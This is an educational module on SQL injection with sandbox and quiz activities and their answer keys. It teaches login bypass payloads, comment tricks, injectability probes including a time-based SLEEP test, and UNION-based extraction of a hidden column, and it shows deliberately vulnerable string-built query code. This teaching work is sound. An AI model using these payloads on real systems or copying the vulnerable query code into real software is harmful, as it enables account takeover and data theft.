# Module 03: Your First Injection

> ⭐⭐ Intermediate | ⏱️ 20 minutes | 7 activities

---

## Learning Objectives
By the end of this module, students will be able to:
- Craft a basic authentication bypass using SQL injection
- Understand how single quotes break SQL query structure
- Use the `OR 1=1` technique and SQL comments effectively
- Test injection hypotheses in a sandbox environment

---

## Lesson Flow

### 3.1 — Breaking the String Barrier (Concept)

**Narrative**: *SQL injection is all about one thing: **escaping the data context**. When you type into a form, the app expects your input to be data — a username, a search term. But if your input contains special SQL characters, it stops being data and starts being **code**.*

**Visual**: Animated character diagram

```
Normal input:    alice
                 ↓
Query becomes:   ... WHERE username = 'alice'
                                       ^^^^^ ← stays inside quotes (DATA)

Malicious input: alice' OR '1'='1
                 ↓
Query becomes:   ... WHERE username = 'alice' OR '1'='1'
                                       ^^^^^          ← escapes quotes (CODE!)
```

**Key Concept**: The single quote `'` is the escape character. It breaks you out of the string context.

---

### 3.2 — The Classic Authentication Bypass

**Narrative**: *Let's build our first real injection. Here's the target — a simple login form connected to this backend:*

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

*Our goal: Log in as `admin` without knowing the password.*

**Step-by-step walkthrough** (student advances each step):

**Step 1 — Understand the template**:
```sql
SELECT * FROM users WHERE username = '[INPUT1]' AND password = '[INPUT2]'
```

**Step 2 — Close the username string**:
```
Input: admin'
Query: SELECT * FROM users WHERE username = 'admin'' AND password = '...'
                                                   ↑ extra quote = SQL error!
```

**Step 3 — Add always-true condition**:
```
Input: admin' OR 1=1
Query: SELECT * FROM users WHERE username = 'admin' OR 1=1' AND password = '...'
                                                          ↑ still broken!
```

**Step 4 — Comment out the rest**:
```
Input: admin'--
Query: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
                                                   ↑↑ everything after -- is ignored
Effective: SELECT * FROM users WHERE username = 'admin'
```

✅ **Success!** Password check is completely bypassed.

---

#### 💻 Activity 3.2a — LIVE SQL SANDBOX

> **Type**: SANDBOX  
> **Difficulty**: Medium

**Setup**: A simulated login form with a SQL query visualizer. The database has the `users` table from Module 01.

**Challenge**: Log in as `admin` without using the correct password.

**Input fields**:
- Username: `[_______________]`
- Password: `[_______________]`

**Live query display**: Shows the constructed query in real-time as the student types.

**Accepted answers** (any of these in the username field):

```
admin'--
admin' --
admin'-- 
' OR 1=1--
' OR '1'='1'--
admin' OR 1=1--
```

**On success**: 🎉 Animation: "Access Granted! You're in as admin." + Show the effective query and explain why it worked.

**On failure**: Show the constructed query and highlight the syntax error or why it didn't return results.

**Hint 1** (after 2 attempts): *Remember, `'` closes the string and `--` comments out the rest.*
**Hint 2** (after 4 attempts): *Try typing `admin'--` as the username.*

---

### 3.3 — Variations on the Theme

**Narrative**: *There's more than one way to bypass a login. Let's explore different payloads and understand why each works.*

#### Payload Comparison Table

| Payload (Username) | Effective Query | How it works |
|---|---|---|
| `admin'--` | `WHERE username = 'admin'` | Targets specific user, comments out password |
| `' OR 1=1--` | `WHERE username = '' OR 1=1` | Returns ALL users, logs in as first user |
| `' OR '1'='1` | `WHERE username = '' OR '1'='1'` | Always-true without needing `--` |
| `admin' OR '1'='1` | `WHERE username = 'admin' OR '1'='1'` | Targets admin, always-true fallback |

---

#### 🧩 Activity 3.3a — MULTIPLE CHOICE

> **Type**: MC  
> **Difficulty**: Medium

**Prompt**: Using the payload `' OR 1=1--` as the username, which user will the attacker log in as?

```
users table:
id=1  alice (admin)
id=2  bob (user)  
id=3  charlie (user)
```

**Options**:
- A) alice (the first row returned) ✅
- B) bob
- C) charlie
- D) All users simultaneously

**Answer**: **A** — The query `WHERE username = '' OR 1=1` returns ALL rows, but the application typically takes the **first result**. Since `alice` has `id=1`, she's returned first. The attacker logs in as alice (the admin!).

**💡 Key Insight**: *This is why `OR 1=1` is especially dangerous — it often grants admin access because admin accounts are usually the first entries in the database.*

---

### 3.4 — Injection Without Comments

**Narrative**: *Some databases don't support `--` comments, or the app filters them out. Can you still inject? Absolutely.*

**The trick**: Instead of commenting out the rest, **complete the query's syntax**.

```
Backend template:
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT2]'
```

```
Input username: ' OR '1'='1
Input password: ' OR '1'='1

Result:
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

Every condition has balanced quotes. No comments needed!

---

#### 🔤 Activity 3.4a — FILL IN THE BLANK

> **Type**: FITB  
> **Difficulty**: Medium

**Prompt**: Complete the injection payload that bypasses login WITHOUT using SQL comments (`--` or `#`):

Username: `' OR '1'='1`  
Password: `____________`

**Expected Answer**: `' OR '1'='1`

**Explanation**: *By making both fields use the same trick, you maintain balanced quotes throughout the query. Both conditions become always-true, and no comment syntax is needed.*

---

### 3.5 — Different Comment Styles

**Narrative**: *Different databases use different comment syntaxes. Knowing which one to use is essential.*

| Database | Line Comment | Block Comment |
|----------|-------------|---------------|
| MySQL | `-- ` (space required!) or `#` | `/* ... */` |
| PostgreSQL | `--` | `/* ... */` |
| SQL Server | `--` | `/* ... */` |
| Oracle | `--` | `/* ... */` |
| SQLite | `--` | `/* ... */` |

⚠️ **MySQL gotcha**: MySQL requires a **space after `--`**. So `admin'--` won't work, but `admin'-- ` will. Alternatively, use `admin'#`.

---

#### 🧩 Activity 3.5a — MULTIPLE CHOICE

> **Type**: MC  
> **Difficulty**: Medium

**Prompt**: You're attacking a MySQL database. Your payload `admin'--` isn't working. What should you try instead?

**Options**:
- A) `admin'-- ` (add a space after --) ✅
- B) `admin'//`
- C) `admin'\n`
- D) `admin'**`

**Answer**: **A** — MySQL requires a space (or other whitespace) after `--` for it to be treated as a comment. Alternatively, `admin'#` would also work since MySQL supports `#` as a comment character.

---

### 3.6 — Detecting Injectability

**Narrative**: *Before crafting a full injection, attackers first test whether a field is injectable. Here are the classic probing techniques:*

**Probe 1 — The Single Quote Test**:
```
Input: '
Expected: SQL error message → Field is likely injectable!
```

**Probe 2 — The Boolean Test**:
```
Input: ' OR '1'='1    →  Should return results (always true)
Input: ' AND '1'='2   →  Should return nothing (always false)
If behavior differs → Field is injectable!
```

**Probe 3 — The Time-Based Test**:
```
Input: ' OR SLEEP(5)--
If response takes 5+ seconds → Field is injectable!
```

---

#### 🧪 Activity 3.6a — PREDICT THE OUTPUT

> **Type**: PREDICT  
> **Difficulty**: Medium

**Prompt**: You enter a single quote `'` into a search field and get this response:

```
Error: You have an error in your SQL syntax; check the manual 
that corresponds to your MySQL server version for the right 
syntax to use near ''''' at line 1
```

What does this tell you?

**Options**:
- A) The search is broken and needs fixing
- B) The application uses MySQL and the search field is vulnerable to SQL injection ✅
- C) The application correctly blocked your injection attempt
- D) MySQL is not running

**Answer**: **B** — The error reveals two things: (1) The app uses MySQL (mentioned in the error), and (2) user input is directly embedded in SQL queries (the quote caused a syntax error instead of being safely handled).

**💡 Key Insight**: *Error messages that expose database information are called **information disclosure vulnerabilities**. They're like a map for attackers.*

---

### 3.7 — Sandbox Challenge

#### 💻 Activity 3.7a — SANDBOX (Capstone Challenge)

> **Type**: SANDBOX  
> **Difficulty**: Hard

**Setup**: A simulated e-commerce search page with a search bar. Backend code:

```python
query = f"SELECT * FROM products WHERE name LIKE '%{search_input}%'"
```

Products table:

| id | name | price | secret_note |
|----|------|-------|-------------|
| 1 | Laptop Pro | 999 | Cost: $400 |
| 2 | Wireless Mouse | 29 | Cost: $5 |
| 3 | USB Cable | 9 | Cost: $0.50 |

**Challenge**: The `secret_note` column isn't displayed on the page. Craft an injection that makes the search results include the `secret_note` column.

**Hint approach** (progressive):
1. *The search wraps your input in `%..%`. You need to escape from the LIKE clause first.*
2. *Think about UNION SELECT — it lets you combine results from two queries.*
3. *Try: `%' UNION SELECT id, name, price, secret_note FROM products--`*

**Expected Solution**:
```
Search input: %' UNION SELECT id, name, price, secret_note FROM products--
```

**Resulting query**:
```sql
SELECT * FROM products WHERE name LIKE '%%' UNION SELECT id, name, price, secret_note FROM products--'
```

**On success**: Shows the secret_note column data. 🎉 "You just performed data exfiltration using UNION-based SQL injection!"

---

## Module 3 Summary

| Concept | Key Takeaway |
|---------|-------------|
| String escape | `'` breaks out of the data context into code context |
| Auth bypass | `admin'--` skips password validation |
| OR 1=1 | Always-true condition returns all rows |
| Comment syntax | `--`, `#`, `/* */` — varies by database |
| Probing | Single quotes and boolean tests detect injectability |
| UNION injection | Combine queries to extract hidden data |

**Teaser for Module 04**: *You've learned the classic injection. But what if the app doesn't show you any error messages or data? Blind SQL injection techniques let you extract data even when you can't see the results directly...*
